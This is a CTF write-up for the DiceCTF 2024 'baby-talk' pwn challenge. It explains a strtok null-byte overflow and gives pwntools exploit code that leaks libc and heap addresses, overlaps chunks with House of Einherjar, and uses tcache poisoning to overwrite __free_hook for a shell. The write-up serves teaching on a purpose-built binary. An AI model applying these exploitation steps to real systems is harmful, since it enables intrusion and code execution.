---
title: 'DiceCTF 2024 Quals'
challenge: 'baby-talk'
date: 2024-02-05T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the DiceCTF 2024 Quals challenge "baby-talk"' 
cover: '/img/dicectf_quals_2024/logo.png'
tags: ['pwn']
draft: false
---

```
take it easy baby, don't you ever grow up, just stay this simple

nc mc.ax 32526
```

### Quick look

The challenge's author supplies us with both the binary and a Dockerfile, which enables the recreation of the server environment where the challenge is executed. From this context, we can discern the version of the libc, specifically identified as *version 2.27*:

```Dockerfile
COPY --from=ubuntu@sha256:dca176c9663a7ba4c1f0e710986f5a25e672842963d95b960191e2d9f7185ebe / /srv
```

```bash
$  ls /srv/lib/x86_64-linux-gnu/libc-*
/srv/lib/x86_64-linux-gnu/libc-2.27.so
```

The code for the challenge is fairly straightforward. Within the main function, we can input a number within the range of 1-4, as illustrated in the screenshot. The functionalities of the other functions are discussed below.

{{< figure src="/img/dicectf_quals_2024/main.png" position="left" caption="main function" captionPosition="left">}}

#### get_num

{{< figure src="/img/dicectf_quals_2024/get_num.png" position="left" caption="get_num function" captionPosition="left">}}

The `get_num` function reads 16 characters into a buffer of 24 characters. Subsequently, the function returns our input as an **unsigned long** after parsing it through the `strtoul` function with a base of 10.

#### get_empty

{{< figure src="/img/dicectf_quals_2024/get_num.png" position="left" caption="get_num function" captionPosition="left">}}

The `get_empty` function is characterized by a while loop designed to pinpoint an empty bucket within the `strs` array. The loop iterates until the index reaches **16**, and if the specified empty bucket is not found within this range, the function returns **-1**.

#### do_str

{{< figure src="/img/dicectf_quals_2024/do_str.png" position="left" caption="do_str function" captionPosition="left">}}

The `do_str` function initially invokes the `get_empty` function. If an empty slot is identified, it prompts for input, determining the size (< 4096) of a new string using `get_num`. Then, it allocates space for the string *on the heap* and inserts the pointer into the `strs` array at the previously found index.

#### do_tok

{{< figure src="/img/dicectf_quals_2024/do_tok.png" position="left" caption="do_tok function" captionPosition="left">}}

The `do_tok` function tokenizes the string at the specified index in the `strs` array using the `strtok` function with a chosen delimiter. It then prints each resulting token.

#### do_del

{{< figure src="/img/dicectf_quals_2024/do_del.png" position="left" caption="do_del function" captionPosition="left">}}

The `do_del` function deallocates the string at the provided index and clears the corresponding bucket in the `strs` array if the bucket is not already empty.

### Vulnerability

The vulnerability here is sneaky, stemming from a null byte overflow injected by the `strtok` function. This particular vulnerability can be exploited to achieve **Remote Code Execution** (RCE).

To demonstrate the vulnerability, begin by utilizing the `do_str` function to allocate a string with a size of **0x38** and populate it with a sequence of **A** characters. This operation will result in the creation of a heap chunk sized 0x40 as showed below:

{{< figure src="/img/dicectf_quals_2024/chunk.png" position="left" caption="Chunk filled with 0x41" captionPosition="left">}}

The bug happens when we invoke the `do_tok` function and tokenize this string using the delimiter **1**. The adjacent chunk containing the byte **1** becomes corrupted due to a null byte poisoning:

{{< figure src="/img/dicectf_quals_2024/poisoned.png" position="left" caption="Chunks after null byte poisoning" captionPosition="left">}}

By consulting the man pages, we can gain insight into the root cause of this behavior:

```man
[...]

The end of each token is found by scanning forward until either the next delimiter byte is found or until  the
terminating null byte ('\0') is encountered.  If a delimiter byte is found, it is overwritten with a null byte
to terminate the current token, and strtok() saves a pointer to the following byte; that pointer will be  used
as  the  starting  point  when  searching for the next token.  In this case, strtok() returns a pointer to the
start of the found token.

[...]
```

### Exploitation

The exploitation of this vulnerability involves employing the [House of Einherjar](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c) to overlap two chunks, coupled with the [tcahe poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) technique to overwrite the `__free_hook`.

Below, I have listed some utility functions that facilitate interaction with the binary:

```python

def alloc(size, str):
    r.sendlineafter(">", "1")
    r.sendafter("size?", f"{size}")
    r.sendlineafter("str?", str)
    r.recvuntil("at ")
    return int(r.recvline(keepends=False)[:-1])

def tok(idx, delim):
    r.sendlineafter(">", "2")
    r.sendlineafter("idx?", f"{idx}")
    r.sendlineafter("delim?", delim)

def free(idx):
    r.sendlineafter(">", "3")
    r.sendafter("idx?", f"{idx}")

```

Initially, we require some leaks, which can be obtained by printing the content of the freed chunks. This is possible because when memory is allocated, it is not cleared, and the `do_str` function does not enforce writing bytes.

```python
a = alloc(4096, "")

b = alloc(0xf8, "")
c = alloc(0x128, b"C" * 0x128)
d = alloc(0xf8, "D" * 0xf8)

free(a)

a = alloc(4096, "")

tok(a, b'\x00')
r.recvline(keepends=False)
leak = r.recvline(keepends=False)

libc.address = (u64(leak.ljust(8, b"\x00")) << 8 )- 0x3ebc00

log.info(f"libc @{libc.address:x}")

free(d)
free(b)

b = alloc(0xf8, b"")

tok(b, b"\x00")

r.recvline(keepends=False)
leak = r.recvline(keepends=False)

heap = u64(leak.ljust(8, b"\x00")) << 8

log.info(f"heap @{heap:x}")

free(b)

b = alloc(0xf8, "B" * 0xf8)
d = alloc(0xf8, "D" * 0xf8)
```

In this code:

- Chunk **a** is used to obtain a libc leak. Upon freeing it, it will move to the unsorted bin, allowing us to extract a libc leak.
- Both chunks **b** and **d** are employed to acquire a heap leak. Upon freeing them, they will enter tcache 0x100, enabling us to obtain a heap leak.

The current state of the heap is as follows:

{{< figure src="/img/dicectf_quals_2024/heap_1.png" position="left" caption="Heap after leaks" captionPosition="left">}}

{{< figure src="/img/dicectf_quals_2024/heap_2.png" position="left" caption="Heap after last allocations" captionPosition="left">}}

In our scenario, the concept of the **House of Einherjar** is applied to manipulate the `PREV_INUSE` flag in the metadata of the **d** chunk, forcing chunk consolidation. This approach allows us to obtain a larger misaligned chunk and achieve chunk overlapping.

Following the technique, the initial step involves filling the *tcache 0x100* to ensure that **d** is directed to the unsorted bin upon freeing.

```python
trash = []

for i in range(0x9):
    trash.append(alloc(0xf8, b"n4slab"))

for chunk in trash:
    free(chunk)
``` 

The current state of the heap is as follows:

{{< figure src="/img/dicectf_quals_2024/heap_4.png" position="left" caption="Allocated chunks" captionPosition="left">}}

{{< figure src="/img/dicectf_quals_2024/heap_3.png" position="left" caption="Tcache 0x100 filled" captionPosition="left">}}

{{< figure src="/img/dicectf_quals_2024/heap_5.png" position="left" caption="Deallocated chunks" captionPosition="left">}}

Next, we poison the `PREV_INUSE` flag of **d** and generate a fake but valid freed chunk within **c**. 

```python
tok(c, b"\x01")

free(c)

fake_freed_chunk = flat(
    p64(0x100),
    p64(0x30),
    p64(heap+96),
    p64(heap+96),
    b"K" * (40 - 8 - 8 - 8), # 40 (total size) - 8 (prev size) - 8 (fd) - 8 (bck) 
    p64(0x30)
) 

c = alloc(0x128, b"C" * (0x128 - 0x38) + fake_freed_chunk)

free(d)
```

{{< figure src="/img/dicectf_quals_2024/heap_6.png" position="left" caption="Before freeing chunk d" captionPosition="left">}}

Upon freeing **d**, the `fake_free_chunk` will undergo consolidation and become part of an *unsorted bin chunk* alongside it.

{{< figure src="/img/dicectf_quals_2024/heap_7.png" position="left" caption="Consolidated unsorted bin chunk" captionPosition="left">}}


```python
k = alloc(50, "")
free(k)
```

Now, we can allocate a smaller chunk **k** that will be placed within **c**, and subsequently free it.

{{< figure src="/img/dicectf_quals_2024/heap_8.png" position="left" caption="Overlapping chunk k" captionPosition="left">}}

{{< figure src="/img/dicectf_quals_2024/heap_9.png" position="left" caption="Chunk k after free" captionPosition="left">}}

With full control over the metadata of the chunk **k**, since it is contained within **c**, we can employ **tcache poisoning**. This enables us to overwrite the `__free_hook` with the address of the *one gadget*.

```python
free(c)

alloc(0x128, b"K" * (0x128 - 40) + p64(libc.symbols["__free_hook"]) + p64(0))

alloc(0x38, "")
alloc(0x38, p64(libc.address + 0x10a2fc))
```

{{< figure src="/img/dicectf_quals_2024/heap_10.png" position="left" caption="Tcache before last malloc" captionPosition="left">}}

Now, after freeing a chunk, a shell will be spawned.

> dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}